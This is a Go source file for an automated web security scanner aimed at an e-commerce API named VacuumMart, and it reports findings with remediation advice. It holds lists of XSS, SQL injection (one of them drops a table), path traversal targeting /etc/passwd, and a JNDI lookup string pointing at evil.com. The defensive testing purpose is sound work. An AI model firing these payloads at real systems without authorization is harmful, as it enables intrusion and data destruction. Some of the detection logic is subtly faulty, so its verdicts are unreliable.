package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/rs/zerolog/log"
)

type SecurityTester struct {
	baseURL    string
	httpClient *http.Client
	results    []SecurityTestResult
}

type SecurityTestResult struct {
	TestName        string    `json:"test_name"`
	Category        string    `json:"category"`
	Severity        string    `json:"severity"`
	Endpoint        string    `json:"endpoint"`
	Attack          string    `json:"attack"`
	Vulnerable      bool      `json:"vulnerable"`
	Description     string    `json:"description"`
	Recommendation  string    `json:"recommendation"`
	ResponseCode    int       `json:"response_code"`
	ResponseSnippet string    `json:"response_snippet"`
	Timestamp       time.Time `json:"timestamp"`
}

func NewSecurityTester(baseURL string) *SecurityTester {
	return &SecurityTester{
		baseURL: strings.TrimSuffix(baseURL, "/"),
		httpClient: &http.Client{
			Timeout: 30 * time.Second,
		},
		results: make([]SecurityTestResult, 0),
	}
}

func (s *SecurityTester) RunTests(ctx context.Context) error {
	log.Info().Msg("Starting security tests for VacuumMart e-commerce platform")
	
	// Run different categories of security tests
	if err := s.testXSSVulnerabilities(ctx); err != nil {
		log.Error().Err(err).Msg("XSS testing failed")
	}
	
	if err := s.testSQLInjection(ctx); err != nil {
		log.Error().Err(err).Msg("SQL injection testing failed")
	}
	
	if err := s.testInputValidation(ctx); err != nil {
		log.Error().Err(err).Msg("Input validation testing failed")
	}
	
	if err := s.testAuthenticationBypass(ctx); err != nil {
		log.Error().Err(err).Msg("Authentication bypass testing failed")
	}
	
	if err := s.testCSRFProtection(ctx); err != nil {
		log.Error().Err(err).Msg("CSRF protection testing failed")
	}
	
	if err := s.testDirectoryTraversal(ctx); err != nil {
		log.Error().Err(err).Msg("Directory traversal testing failed")
	}
	
	if err := s.testHTTPSecurity(ctx); err != nil {
		log.Error().Err(err).Msg("HTTP security testing failed")
	}
	
	if err := s.testBusinessLogicFlaws(ctx); err != nil {
		log.Error().Err(err).Msg("Business logic flaw testing failed")
	}
	
	s.generateSecurityReport()
	return nil
}

func (s *SecurityTester) testXSSVulnerabilities(ctx context.Context) error {
	log.Info().Msg("Testing for XSS vulnerabilities")
	
	xssPayloads := []string{
		"<script>alert('XSS')</script>",
		"<img src=x onerror=alert('XSS')>",
		"javascript:alert('XSS')",
		"'><script>alert('XSS')</script>",
		"\"><script>alert('XSS')</script>",
		"<svg onload=alert('XSS')>",
		"<iframe src=javascript:alert('XSS')>",
		"<body onload=alert('XSS')>",
		"<input onfocus=alert('XSS') autofocus>",
		"<select onfocus=alert('XSS') autofocus>",
	}
	
	// Test search functionality
	for _, payload := range xssPayloads {
		s.testXSSEndpoint(ctx, "/api/products/search", "q", payload, "Search XSS")
	}
	
	// Test product review functionality
	for _, payload := range xssPayloads {
		reviewData := map[string]interface{}{
			"rating":  5,
			"comment": payload,
			"title":   payload,
		}
		s.testXSSPostEndpoint(ctx, "/api/products/1/reviews", reviewData, "Review XSS")
	}
	
	// Test user registration
	for _, payload := range xssPayloads {
		userData := map[string]interface{}{
			"name":     payload,
			"email":    fmt.Sprintf("test%s@example.com", time.Now().Unix()),
			"password": "password123",
		}
		s.testXSSPostEndpoint(ctx, "/api/users/register", userData, "Registration XSS")
	}
	
	return nil
}

func (s *SecurityTester) testSQLInjection(ctx context.Context) error {
	log.Info().Msg("Testing for SQL injection vulnerabilities")
	
	sqlPayloads := []string{
		"' OR '1'='1",
		"' OR 1=1--",
		"' UNION SELECT null,null,null--",
		"'; DROP TABLE products;--",
		"' OR '1'='1' /*",
		"admin'--",
		"admin' /*",
		"' OR 1=1#",
		"' OR 'a'='a",
		"') OR ('1'='1",
		"1' AND (SELECT COUNT(*) FROM products)>0--",
		"1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
	}
	
	// Test product search
	for _, payload := range sqlPayloads {
		s.testSQLInjectionEndpoint(ctx, "/api/products/search", "q", payload, "Search SQL Injection")
	}
	
	// Test product filtering
	for _, payload := range sqlPayloads {
		s.testSQLInjectionEndpoint(ctx, "/api/products", "category", payload, "Category Filter SQL Injection")
		s.testSQLInjectionEndpoint(ctx, "/api/products", "brand", payload, "Brand Filter SQL Injection")
	}
	
	// Test login functionality
	for _, payload := range sqlPayloads {
		loginData := map[string]interface{}{
			"email":    payload,
			"password": payload,
		}
		s.testSQLInjectionPostEndpoint(ctx, "/api/users/login", loginData, "Login SQL Injection")
	}
	
	// Test product ID parameter
	for _, payload := range sqlPayloads {
		endpoint := fmt.Sprintf("/api/products/%s", url.QueryEscape(payload))
		s.testSQLInjectionDirectEndpoint(ctx, endpoint, "Product ID SQL Injection")
	}
	
	return nil
}

func (s *SecurityTester) testInputValidation(ctx context.Context) error {
	log.Info().Msg("Testing input validation")
	
	// Test oversized inputs
	longString := strings.Repeat("A", 10000)
	s.testInputValidationEndpoint(ctx, "/api/products/search", "q", longString, "Oversized Input", "Buffer overflow protection")
	
	// Test invalid data types
	invalidInputs := []interface{}{
		make(map[string]interface{}), // Object instead of string
		[]string{"array", "input"},   // Array instead of string
		12345,                        // Number instead of string
		true,                         // Boolean instead of string
	}
	
	for _, input := range invalidInputs {
		userData := map[string]interface{}{
			"name":     input,
			"email":    "test@example.com",
			"password": "password123",
		}
		s.testInputValidationPostEndpoint(ctx, "/api/users/register", userData, "Invalid Data Type", "Type validation")
	}
	
	// Test null bytes and special characters
	specialChars := []string{
		"\x00",           // Null byte
		"\r\n",           // CRLF injection
		"../../../etc/passwd", // Path traversal
		"${jndi:ldap://evil.com/}", // LDAP injection
	}
	
	for _, char := range specialChars {
		s.testInputValidationEndpoint(ctx, "/api/products/search", "q", char, "Special Characters", "Special character filtering")
	}
	
	return nil
}

func (s *SecurityTester) testAuthenticationBypass(ctx context.Context) error {
	log.Info().Msg("Testing authentication bypass vulnerabilities")
	
	// Test admin endpoints without authentication
	adminEndpoints := []string{
		"/api/admin/orders",
		"/api/admin/inventory",
		"/api/admin/analytics/sales",
		"/api/admin/products/1/inventory",
	}
	
	for _, endpoint := range adminEndpoints {
		s.testAuthBypassEndpoint(ctx, endpoint, "Admin Access Without Auth")
	}
	
	// Test with invalid tokens
	invalidTokens := []string{
		"invalid_token",
		"Bearer invalid",
		"JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid",
		"",
	}
	
	for _, token := range invalidTokens {
		s.testAuthBypassWithToken(ctx, "/api/admin/orders", token, "Invalid Token Bypass")
	}
	
	// Test privilege escalation
	s.testPrivilegeEscalation(ctx)
	
	return nil
}

func (s *SecurityTester) testCSRFProtection(ctx context.Context) error {
	log.Info().Msg("Testing CSRF protection")
	
	// Test state-changing operations without CSRF tokens
	csrfTestCases := []struct {
		endpoint string
		method   string
		data     interface{}
		testName string
	}{
		{"/api/cart/items", "POST", map[string]interface{}{"product_id": 1, "quantity": 1}, "Add to Cart CSRF"},
		{"/api/orders", "POST", map[string]interface{}{"customer_id": 1}, "Create Order CSRF"},
		{"/api/users/profile", "PUT", map[string]interface{}{"name": "Changed"}, "Update Profile CSRF"},
	}
	
	for _, test := range csrfTestCases {
		s.testCSRFEndpoint(ctx, test.endpoint, test.method, test.data, test.testName)
	}
	
	return nil
}

func (s *SecurityTester) testDirectoryTraversal(ctx context.Context) error {
	log.Info().Msg("Testing directory traversal vulnerabilities")
	
	traversalPayloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"....//....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
	}
	
	// Test file access endpoints
	for _, payload := range traversalPayloads {
		endpoint := fmt.Sprintf("/static/%s", payload)
		s.testDirectoryTraversalEndpoint(ctx, endpoint, payload, "Static File Traversal")
		
		// Test as parameter
		s.testInputValidationEndpoint(ctx, "/api/products/image", "file", payload, "Image File Traversal", "Path traversal protection")
	}
	
	return nil
}

func (s *SecurityTester) testHTTPSecurity(ctx context.Context) error {
	log.Info().Msg("Testing HTTP security headers and configurations")
	
	// Test security headers
	s.testSecurityHeaders(ctx, "/", "Homepage Security Headers")
	s.testSecurityHeaders(ctx, "/api/products", "API Security Headers")
	
	// Test HTTP methods
	s.testHTTPMethods(ctx, "/api/products")
	
	return nil
}

func (s *SecurityTester) testBusinessLogicFlaws(ctx context.Context) error {
	log.Info().Msg("Testing business logic vulnerabilities")
	
	// Test negative quantity in cart
	s.testBusinessLogicEndpoint(ctx, "/api/cart/items", map[string]interface{}{
		"product_id": 1,
		"quantity":   -1,
	}, "Negative Quantity", "Should reject negative quantities")
	
	// Test zero price manipulation
	s.testBusinessLogicEndpoint(ctx, "/api/orders", map[string]interface{}{
		"items": []map[string]interface{}{
			{"product_id": 1, "price": 0, "quantity": 1},
		},
	}, "Zero Price Manipulation", "Should use server-side pricing")
	
	// Test excessive quantity
	s.testBusinessLogicEndpoint(ctx, "/api/cart/items", map[string]interface{}{
		"product_id": 1,
		"quantity":   999999,
	}, "Excessive Quantity", "Should enforce quantity limits")
	
	return nil
}

func (s *SecurityTester) testXSSEndpoint(ctx context.Context, endpoint, param, payload, testName string) {
	s.testSecurityEndpoint(ctx, "GET", endpoint, param, payload, testName, "XSS", "HIGH", 
		"Potential XSS vulnerability detected", "Implement proper input sanitization and output encoding")
}

func (s *SecurityTester) testXSSPostEndpoint(ctx context.Context, endpoint string, data interface{}, testName string) {
	s.testSecurityPostEndpoint(ctx, endpoint, data, testName, "XSS", "HIGH",
		"Potential XSS vulnerability in POST data", "Implement proper input sanitization and output encoding")
}

func (s *SecurityTester) testSQLInjectionEndpoint(ctx context.Context, endpoint, param, payload, testName string) {
	s.testSecurityEndpoint(ctx, "GET", endpoint, param, payload, testName, "SQL Injection", "CRITICAL",
		"Potential SQL injection vulnerability detected", "Use parameterized queries and input validation")
}

func (s *SecurityTester) testSQLInjectionPostEndpoint(ctx context.Context, endpoint string, data interface{}, testName string) {
	s.testSecurityPostEndpoint(ctx, endpoint, data, testName, "SQL Injection", "CRITICAL",
		"Potential SQL injection vulnerability in POST data", "Use parameterized queries and input validation")
}

func (s *SecurityTester) testSQLInjectionDirectEndpoint(ctx context.Context, endpoint, testName string) {
	start := time.Now()
	
	req, err := http.NewRequestWithContext(ctx, "GET", s.baseURL+endpoint, nil)
	if err != nil {
		return
	}
	
	resp, err := s.httpClient.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	
	// Check for SQL error messages in response
	buf := make([]byte, 1024)
	n, _ := resp.Body.Read(buf)
	responseBody := string(buf[:n])
	
	vulnerable := s.containsSQLError(responseBody) || resp.StatusCode == 500
	
	result := SecurityTestResult{
		TestName:        testName,
		Category:        "SQL Injection",
		Severity:        "CRITICAL",
		Endpoint:        endpoint,
		Attack:          endpoint,
		Vulnerable:      vulnerable,
		Description:     "Potential SQL injection vulnerability in URL parameter",
		Recommendation:  "Use parameterized queries and input validation",
		ResponseCode:    resp.StatusCode,
		ResponseSnippet: responseBody[:min(len(responseBody), 200)],
		Timestamp:       start,
	}
	
	s.results = append(s.results, result)
	s.logSecurityResult(result)
}

func (s *SecurityTester) testInputValidationEndpoint(ctx context.Context, endpoint, param, payload, testName, recommendation string) {
	s.testSecurityEndpoint(ctx, "GET", endpoint, param, payload, testName, "Input Validation", "MEDIUM",
		"Input validation vulnerability detected", recommendation)
}

func (s *SecurityTester) testInputValidationPostEndpoint(ctx context.Context, endpoint string, data interface{}, testName, recommendation string) {
	s.testSecurityPostEndpoint(ctx, endpoint, data, testName, "Input Validation", "MEDIUM",
		"Input validation vulnerability in POST data", recommendation)
}

func (s *SecurityTester) testAuthBypassEndpoint(ctx context.Context, endpoint, testName string) {
	start := time.Now()
	
	req, err := http.NewRequestWithContext(ctx, "GET", s.baseURL+endpoint, nil)
	if err != nil {
		return
	}
	
	resp, err := s.httpClient.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	
	// If we get 200 OK for admin endpoint without auth, it's vulnerable
	vulnerable := resp.StatusCode == 200
	
	result := SecurityTestResult{
		TestName:        testName,
		Category:        "Authentication Bypass",
		Severity:        "CRITICAL",
		Endpoint:        endpoint,
		Attack:          "Access without authentication",
		Vulnerable:      vulnerable,
		Description:     "Admin endpoint accessible without authentication",
		Recommendation:  "Implement proper authentication and authorization",
		ResponseCode:    resp.StatusCode,
		Timestamp:       start,
	}
	
	s.results = append(s.results, result)
	s.logSecurityResult(result)
}

func (s *SecurityTester) testAuthBypassWithToken(ctx context.Context, endpoint, token, testName string) {
	start := time.Now()
	
	req, err := http.NewRequestWithContext(ctx, "GET", s.baseURL+endpoint, nil)
	if err != nil {
		return
	}
	
	if token != "" {
		req.Header.Set("Authorization", token)
	}
	
	resp, err := s.httpClient.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	
	vulnerable := resp.StatusCode == 200
	
	result := SecurityTestResult{
		TestName:        testName,
		Category:        "Authentication Bypass",
		Severity:        "HIGH",
		Endpoint:        endpoint,
		Attack:          fmt.Sprintf("Invalid token: %s", token),
		Vulnerable:      vulnerable,
		Description:     "Endpoint accessible with invalid authentication token",
		Recommendation:  "Implement proper token validation",
		ResponseCode:    resp.StatusCode,
		Timestamp:       start,
	}
	
	s.results = append(s.results, result)
	s.logSecurityResult(result)
}

func (s *SecurityTester) testPrivilegeEscalation(ctx context.Context) {
	// Test if regular user can access admin functions
	// This would require implementing proper test user setup
	log.Info().Msg("Testing privilege escalation (requires test user setup)")
}

func (s *SecurityTester) testCSRFEndpoint(ctx context.Context, endpoint, method string, data interface{}, testName string) {
	start := time.Now()
	
	var req *http.Request
	var err error
	
	if data != nil {
		jsonData, _ := json.Marshal(data)
		req, err = http.NewRequestWithContext(ctx, method, s.baseURL+endpoint, bytes.NewBuffer(jsonData))
		req.Header.Set("Content-Type", "application/json")
	} else {
		req, err = http.NewRequestWithContext(ctx, method, s.baseURL+endpoint, nil)
	}
	
	if err != nil {
		return
	}
	
	// Don't send CSRF token to test if endpoint is protected
	resp, err := s.httpClient.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	
	// If operation succeeds without CSRF token, it's vulnerable
	vulnerable := resp.StatusCode >= 200 && resp.StatusCode < 300
	
	result := SecurityTestResult{
		TestName:        testName,
		Category:        "CSRF",
		Severity:        "HIGH",
		Endpoint:        endpoint,
		Attack:          fmt.Sprintf("%s without CSRF token", method),
		Vulnerable:      vulnerable,
		Description:     "State-changing operation possible without CSRF protection",
		Recommendation:  "Implement CSRF token validation",
		ResponseCode:    resp.StatusCode,
		Timestamp:       start,
	}
	
	s.results = append(s.results, result)
	s.logSecurityResult(result)
}

func (s *SecurityTester) testDirectoryTraversalEndpoint(ctx context.Context, endpoint, payload, testName string) {
	start := time.Now()
	
	req, err := http.NewRequestWithContext(ctx, "GET", s.baseURL+endpoint, nil)
	if err != nil {
		return
	}
	
	resp, err := s.httpClient.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	
	buf := make([]byte, 1024)
	n, _ := resp.Body.Read(buf)
	responseBody := string(buf[:n])
	
	// Check for system file contents
	vulnerable := s.containsSystemFileContent(responseBody)
	
	result := SecurityTestResult{
		TestName:        testName,
		Category:        "Directory Traversal",
		Severity:        "HIGH",
		Endpoint:        endpoint,
		Attack:          payload,
		Vulnerable:      vulnerable,
		Description:     "Potential directory traversal vulnerability",
		Recommendation:  "Implement proper path validation and sanitization",
		ResponseCode:    resp.StatusCode,
		ResponseSnippet: responseBody[:min(len(responseBody), 200)],
		Timestamp:       start,
	}
	
	s.results = append(s.results, result)
	s.logSecurityResult(result)
}

func (s *SecurityTester) testSecurityHeaders(ctx context.Context, endpoint, testName string) {
	start := time.Now()
	
	req, err := http.NewRequestWithContext(ctx, "GET", s.baseURL+endpoint, nil)
	if err != nil {
		return
	}
	
	resp, err := s.httpClient.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	
	securityHeaders := map[string]string{
		"X-Frame-Options":           "DENY or SAMEORIGIN",
		"X-Content-Type-Options":    "nosniff",
		"X-XSS-Protection":          "1; mode=block",
		"Content-Security-Policy":   "restrictive policy",
		"Strict-Transport-Security": "max-age directive",
	}
	
	missingHeaders := make([]string, 0)
	for header := range securityHeaders {
		if resp.Header.Get(header) == "" {
			missingHeaders = append(missingHeaders, header)
		}
	}
	
	vulnerable := len(missingHeaders) > 0
	
	result := SecurityTestResult{
		TestName:       testName,
		Category:       "HTTP Security Headers",
		Severity:       "MEDIUM",
		Endpoint:       endpoint,
		Attack:         "Missing security headers",
		Vulnerable:     vulnerable,
		Description:    fmt.Sprintf("Missing security headers: %v", missingHeaders),
		Recommendation: "Implement all recommended security headers",
		ResponseCode:   resp.StatusCode,
		Timestamp:      start,
	}
	
	s.results = append(s.results, result)
	s.logSecurityResult(result)
}

func (s *SecurityTester) testHTTPMethods(ctx context.Context, endpoint string) {
	methods := []string{"OPTIONS", "TRACE", "PUT", "DELETE", "PATCH"}
	
	for _, method := range methods {
		start := time.Now()
		
		req, err := http.NewRequestWithContext(ctx, method, s.baseURL+endpoint, nil)
		if err != nil {
			continue
		}
		
		resp, err := s.httpClient.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		
		// Methods like TRACE and OPTIONS shouldn't be allowed on API endpoints
		vulnerable := (method == "TRACE" || method == "OPTIONS") && resp.StatusCode == 200
		
		result := SecurityTestResult{
			TestName:       fmt.Sprintf("HTTP Method %s", method),
			Category:       "HTTP Methods",
			Severity:       "LOW",
			Endpoint:       endpoint,
			Attack:         fmt.Sprintf("%s method", method),
			Vulnerable:     vulnerable,
			Description:    fmt.Sprintf("HTTP method %s is allowed", method),
			Recommendation: "Disable unnecessary HTTP methods",
			ResponseCode:   resp.StatusCode,
			Timestamp:      start,
		}
		
		s.results = append(s.results, result)
		s.logSecurityResult(result)
	}
}

func (s *SecurityTester) testBusinessLogicEndpoint(ctx context.Context, endpoint string, data interface{}, testName, description string) {
	s.testSecurityPostEndpoint(ctx, endpoint, data, testName, "Business Logic", "MEDIUM", description, "Implement proper business logic validation")
}

func (s *SecurityTester) testSecurityEndpoint(ctx context.Context, method, endpoint, param, payload, testName, category, severity, description, recommendation string) {
	start := time.Now()
	
	url := fmt.Sprintf("%s%s?%s=%s", s.baseURL, endpoint, param, url.QueryEscape(payload))
	req, err := http.NewRequestWithContext(ctx, method, url, nil)
	if err != nil {
		return
	}
	
	resp, err := s.httpClient.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	
	buf := make([]byte, 1024)
	n, _ := resp.Body.Read(buf)
	responseBody := string(buf[:n])
	
	var vulnerable bool
	switch category {
	case "XSS":
		vulnerable = s.containsXSSPayload(responseBody, payload)
	case "SQL Injection":
		vulnerable = s.containsSQLError(responseBody) || resp.StatusCode == 500
	default:
		vulnerable = resp.StatusCode == 500 // Generic error detection
	}
	
	result := SecurityTestResult{
		TestName:        testName,
		Category:        category,
		Severity:        severity,
		Endpoint:        endpoint,
		Attack:          payload,
		Vulnerable:      vulnerable,
		Description:     description,
		Recommendation:  recommendation,
		ResponseCode:    resp.StatusCode,
		ResponseSnippet: responseBody[:min(len(responseBody), 200)],
		Timestamp:       start,
	}
	
	s.results = append(s.results, result)
	s.logSecurityResult(result)
}

func (s *SecurityTester) testSecurityPostEndpoint(ctx context.Context, endpoint string, data interface{}, testName, category, severity, description, recommendation string) {
	start := time.Now()
	
	jsonData, err := json.Marshal(data)
	if err != nil {
		return
	}
	
	req, err := http.NewRequestWithContext(ctx, "POST", s.baseURL+endpoint, bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	
	resp, err := s.httpClient.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	
	buf := make([]byte, 1024)
	n, _ := resp.Body.Read(buf)
	responseBody := string(buf[:n])
	
	var vulnerable bool
	switch category {
	case "XSS":
		vulnerable = s.containsXSSInResponse(responseBody, data)
	case "SQL Injection":
		vulnerable = s.containsSQLError(responseBody) || resp.StatusCode == 500
	case "Business Logic":
		vulnerable = resp.StatusCode >= 200 && resp.StatusCode < 300 // Operation succeeded when it shouldn't
	default:
		vulnerable = resp.StatusCode == 500
	}
	
	result := SecurityTestResult{
		TestName:        testName,
		Category:        category,
		Severity:        severity,
		Endpoint:        endpoint,
		Attack:          string(jsonData),
		Vulnerable:      vulnerable,
		Description:     description,
		Recommendation:  recommendation,
		ResponseCode:    resp.StatusCode,
		ResponseSnippet: responseBody[:min(len(responseBody), 200)],
		Timestamp:       start,
	}
	
	s.results = append(s.results, result)
	s.logSecurityResult(result)
}

func (s *SecurityTester) containsXSSPayload(response, payload string) bool {
	// Check if the payload appears unescaped in the response
	return strings.Contains(response, payload)
}

func (s *SecurityTester) containsXSSInResponse(response string, data interface{}) bool {
	dataStr, _ := json.Marshal(data)
	return strings.Contains(response, "<script>") || strings.Contains(string(dataStr), "<script>")
}

func (s *SecurityTester) containsSQLError(response string) bool {
	sqlErrors := []string{
		"SQL syntax",
		"mysql_fetch",
		"ORA-",
		"PostgreSQL",
		"sqlite",
		"Microsoft SQL",
		"ODBC SQL",
		"SQLite",
		"Warning: mysql",
		"valid MySQL result",
		"MySqlClient",
	}
	
	responseLower := strings.ToLower(response)
	for _, sqlError := range sqlErrors {
		if strings.Contains(responseLower, strings.ToLower(sqlError)) {
			return true
		}
	}
	return false
}

func (s *SecurityTester) containsSystemFileContent(response string) bool {
	systemIndicators := []string{
		"root:x:",           // /etc/passwd
		"[boot loader]",     // Windows boot.ini
		"127.0.0.1",        // /etc/hosts
		"localhost",        // /etc/hosts
		"# Copyright",      // Common in system files
	}
	
	for _, indicator := range systemIndicators {
		if strings.Contains(response, indicator) {
			return true
		}
	}
	return false
}

func (s *SecurityTester) logSecurityResult(result SecurityTestResult) {
	logLevel := log.Info()
	if result.Vulnerable {
		switch result.Severity {
		case "CRITICAL":
			logLevel = log.Error()
		case "HIGH":
			logLevel = log.Warn()
		default:
			logLevel = log.Warn()
		}
	}
	
	logLevel.
		Str("test", result.TestName).
		Str("category", result.Category).
		Str("severity", result.Severity).
		Str("endpoint", result.Endpoint).
		Bool("vulnerable", result.Vulnerable).
		Int("response_code", result.ResponseCode).
		Msg("Security test completed")
}

func (s *SecurityTester) generateSecurityReport() {
	log.Info().Msg("Generating security test report")
	
	totalTests := len(s.results)
	vulnerabilities := 0
	criticalVulns := 0
	highVulns := 0
	mediumVulns := 0
	lowVulns := 0
	
	categoryCount := make(map[string]int)
	
	for _, result := range s.results {
		if result.Vulnerable {
			vulnerabilities++
			switch result.Severity {
			case "CRITICAL":
				criticalVulns++
			case "HIGH":
				highVulns++
			case "MEDIUM":
				mediumVulns++
			case "LOW":
				lowVulns++
			}
		}
		categoryCount[result.Category]++
	}
	
	log.Info().
		Int("total_tests", totalTests).
		Int("vulnerabilities", vulnerabilities).
		Int("critical", criticalVulns).
		Int("high", highVulns).
		Int("medium", mediumVulns).
		Int("low", lowVulns).
		Interface("categories", categoryCount).
		Msg("Security test summary")
	
	// Save detailed results
	reportData := map[string]interface{}{
		"summary": map[string]interface{}{
			"total_tests":      totalTests,
			"vulnerabilities":  vulnerabilities,
			"critical_vulns":   criticalVulns,
			"high_vulns":       highVulns,
			"medium_vulns":     mediumVulns,
			"low_vulns":        lowVulns,
			"risk_score":       s.calculateRiskScore(criticalVulns, highVulns, mediumVulns, lowVulns),
		},
		"category_breakdown": categoryCount,
		"detailed_results":   s.results,
		"test_timestamp":     time.Now().Format(time.RFC3339),
		"recommendations":    s.getSecurityRecommendations(),
	}
	
	if jsonData, err := json.MarshalIndent(reportData, "", "  "); err == nil {
		log.Info().Str("report", string(jsonData)).Msg("Detailed security test report")
	}
}

func (s *SecurityTester) calculateRiskScore(critical, high, medium, low int) float64 {
	// Weighted risk score calculation
	return float64(critical*10 + high*7 + medium*4 + low*1)
}

func (s *SecurityTester) getSecurityRecommendations() []string {
	return []string{
		"Implement comprehensive input validation and sanitization",
		"Use parameterized queries to prevent SQL injection",
		"Add proper output encoding to prevent XSS",
		"Implement CSRF token validation for state-changing operations",
		"Add security headers (CSP, X-Frame-Options, etc.)",
		"Implement proper authentication and authorization",
		"Use HTTPS for all communications",
		"Add rate limiting to prevent abuse",
		"Implement proper error handling (don't expose system details)",
		"Regular security audits and penetration testing",
		"Keep dependencies and frameworks updated",
		"Implement proper logging and monitoring",
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
